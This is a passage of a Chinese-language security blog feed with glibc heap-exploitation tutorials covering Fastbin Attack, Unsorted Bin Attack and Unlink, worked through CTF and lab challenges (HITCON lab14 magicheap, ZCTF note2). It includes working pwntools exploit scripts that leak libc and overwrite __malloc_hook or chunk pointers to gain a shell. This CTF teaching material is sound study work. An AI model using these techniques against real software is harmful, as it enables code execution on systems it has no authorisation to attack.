class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(unsortedbin_addr)</span><br><span class="line">main_arena = unsortedbin_addr - offset_bin_main_arena(<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">'main arena addr: '</span> + hex(main_arena))</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># edit idx4's fd point to fake chunk</span></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">log.success(hex(fake_chunk_addr))</span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,  fake_chunk)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 6</span></span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">'a'</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>,  payload)</span><br><span class="line"><span class="comment"># trigger malloc_hook</span></span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;堆溢出-Fastbin-Attack&quot;&gt;&lt;a href=&quot;#堆溢出-Fastbin-Attack&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Fastbin Attack&quot;&gt;&lt;/a&gt;堆溢出-Fastbin Attack&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Unsorted Bin Attack</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Unsorted%20Bin%20Attack/"/>
    <id>https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Unsorted%20Bin%20Attack/</id>
    <published>2020-01-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:30:04.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Unsorted-Bin-Attack"><a href="#堆溢出-Unsorted-Bin-Attack" class="headerlink" title="堆溢出-Unsorted Bin Attack"></a>堆溢出-Unsorted Bin Attack</h1><p>被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针，可以达到的效果是实现修改任意地址值为一个较大的数值。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="Unsorted-Bin-的产生"><a href="#Unsorted-Bin-的产生" class="headerlink" title="Unsorted Bin 的产生"></a>Unsorted Bin 的产生</h3><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，如果不是和 top chunk 近邻的话，可能会把合并后的 chunk 放到 unsorted bin 中。</li></ol><h3 id="Unsorted-Bin-的使用"><a href="#Unsorted-Bin-的使用" class="headerlink" title="Unsorted Bin 的使用"></a>Unsorted Bin 的使用</h3><ol><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li></ol><p><code>_int_malloc</code> 中，当将一个 unsorted bin 取出的时候，会将 <code>bk-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置，如果我们控制了 bk 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/15/wPq2HpQCOvultFA.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/15/wPq2HpQCOvultFA.png" class="lazyload"></a></p><p><strong>初始状态时</strong><br>unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。</p><p><strong>执行 free(p)</strong><br>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p><p><strong>修改 p[1]</strong><br>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><strong>申请 400 大小的 chunk</strong><br>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks(av)-&gt;bk=p</span><br><span class="line">bck = victim-&gt;bk=p-&gt;bk = target addr<span class="number">-16</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck=target addr<span class="number">-16</span></span><br><span class="line">bck-&gt;fd = *(target addr <span class="number">-16</span>+<span class="number">16</span>) = unsorted_chunks(av);</span><br></pre></td></tr></table></figure></div><p><strong>在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><p><strong>作用</strong></p><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样就可以去执行一些 fast bin attack 了。</li></ul><h2 id="例-HITCON-Training-lab14-magic-heap"><a href="#例-HITCON-Training-lab14-magic-heap" class="headerlink" title="例 HITCON Training lab14 magic heap"></a>例 HITCON Training lab14 magic heap</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       Magic Heap Creator       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 1. Create a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 2. Edit a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 3. Delete a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 4. Exit                        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Your choice :"</span>);</span><br><span class="line"></span><br><span class="line">create_heap();</span><br><span class="line">edit_heap(&amp;buf, &amp;buf);</span><br><span class="line">delete_heap(&amp;buf, &amp;buf);</span><br></pre></td></tr></table></figure></div><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ol><li>创建堆。根据用户指定大小申请相应堆，并且读入指定长度的内容，但是并没有设置 NULL。</li><li>编辑堆。根据指定的索引判断对应堆是不是非空，如果非空，就根据用户读入的大小，来修改堆的内容，这里出现了任意长度堆溢出的漏洞。</li><li>删除堆。根据指定的索引判断对应堆是不是非空，如果非空，就将对应堆释放并置为 NULL。</li></ol><p>当控制 v3 为 4869，同时控制 magic 大于 4869，就可以得到 flag 。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol><li>释放一个堆块到 unsorted bin 中。</li><li>利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &amp;magic-16。</li><li>触发漏洞</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./magicheap'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./magicheap"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_heap</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_heap</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">"dada"</span>)  <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">"dada"</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">"dada"</span>)  <span class="comment"># 2</span></span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fd = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(elf.symbols[<span class="string">"magic"</span>] - <span class="number">0x10</span>)</span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="number">0x40</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">"123456"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"4869"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;堆溢出-Unsorted-Bin-Attack&quot;&gt;&lt;a href=&quot;#堆溢出-Unsorted-Bin-Attack&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Unsorted Bin Attack&quot;&gt;&lt;/a&gt;堆溢出-Unsorted Bin</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Unlink</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Unlink/"/>
    <id>https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Unlink/</id>
    <published>2020-01-05T16:00:00.000Z</published>
    <updated>2020-03-16T04:29:49.951Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Unlink"><a href="#堆溢出-Unlink" class="headerlink" title="堆溢出-Unlink"></a>堆溢出-Unlink</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><a href="https://i.loli.net/2020/01/05/rsipB2cPVI7lFtv.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/01/05/rsipB2cPVI7lFtv.png" class="lazyload"></a></p><p>对 fd 和 bk 的检查</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对 fd 和 bk 的检查</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></div><p>通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18。</p><p>64位：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd &#x3D; &amp;P-0x18</span><br><span class="line">bk &#x3D; &amp;P-0x10</span><br><span class="line">效果： P &#x3D; &amp;P-0X18</span><br></pre></td></tr></table></figure></div><p>32 位</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd &#x3D; &amp;p-12</span><br><span class="line">bk &#x3D; &amp;p-8</span><br><span class="line">效果: p &#x3D;&amp;p-12</span><br></pre></td></tr></table></figure></div><h2 id="例-2016-ZCTF-note2"><a href="#例-2016-ZCTF-note2" class="headerlink" title="例 2016 ZCTF note2"></a>例 2016 ZCTF note2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">功能</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1.New note\n2.Show  note\n3.Edit note\n4.Delete note\n5.Quit\noption---&gt;&gt;"</span>);</span><br></pre></td></tr></table></figure></div><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">新建note</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400B96</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *size_4; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_602160 &gt; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"note lists are full"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the length of the note content:(less than 128)"</span>);</span><br><span class="line">  <span class="built_in">size</span> = sub_400A4A(<span class="string">"Input the length of the note content:(less than 128)"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x80</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too long"</span>);</span><br><span class="line">  size_4 = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the note content:"</span>);</span><br><span class="line">  sub_4009BD(size_4, <span class="built_in">size</span>, <span class="number">10</span>);         <span class="comment">////////////读取函数，漏洞点</span></span><br><span class="line">  sub_400B10(size_4);</span><br><span class="line">  *(&amp;ptr + dword_602160) = size_4;</span><br><span class="line">  qword_602140[dword_602160] = <span class="built_in">size</span>;</span><br><span class="line">  v2 = dword_602160++;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"note add success, the id is %d\n"</span>, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_4009BD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]      变量类型为unsigned，因此0-1=unsigned最大值</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )          <span class="comment">//////// 令a2=0，将循环unsigned最大值次，可以造成堆溢出</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>note操作如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">'./note2'</span>)</span><br><span class="line">note2 = ELF(<span class="string">'./note2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(less than 128)'</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(id, choice, s)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletenote</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br></pre></td></tr></table></figure></div><h4 id="构造三个chunk用于实现unlink"><a href="#构造三个chunk用于实现unlink" class="headerlink" title="构造三个chunk用于实现unlink"></a>构造三个chunk用于实现unlink</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'Input your name:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your address:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk0: a fake chunk</span></span><br><span class="line">ptr = <span class="number">0x0000000000602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(fakefd) + p64(fakebk) + <span class="string">'b'</span> * <span class="number">64</span> + p64(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#content = p64(fakefd) + p64(fakebk)</span></span><br><span class="line">newnote(<span class="number">128</span>, content)</span><br><span class="line"><span class="comment"># chunk1: a zero size chunk produce overwrite</span></span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"><span class="comment"># chunk2: a chunk to be overwrited and freed</span></span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">'b'</span> * <span class="number">16</span>)</span><br></pre></td></tr></table></figure></div><p>chunk0 中一共构造了两个 chunk</p><ul><li><p>chunk ptr[0]，这个是为了 unlink 时修改对应的值。</p></li><li><p>chunk ptr[0]’s nextchunk，这个是为了使得 unlink 时的第一个检查满足。</p><p>  // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。<br>  if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</p><pre><code>malloc_printerr (&quot;corrupted size vs. prev_size&quot;);    </code></pre></li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前堆内构造</span><br><span class="line">pwndbg&gt; x&#x2F;50xg 0x144d280</span><br><span class="line">0x144d280:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d290:0x00000000000000000x0000000000000091  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; chunk0   size&#x3D;0x80</span><br><span class="line">0x144d2a0:0x61616161616161610x0000000000000061</span><br><span class="line">0x144d2b0:0x00000000006021080x0000000000602110 ------&gt; fd  bk</span><br><span class="line">0x144d2c0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d2d0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d2e0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d2f0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d300:0x00000000000000600x0000000000000000 ------&gt; prev_size&#x3D;0x60</span><br><span class="line">0x144d310:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d320:0x00000000000000000x0000000000000021  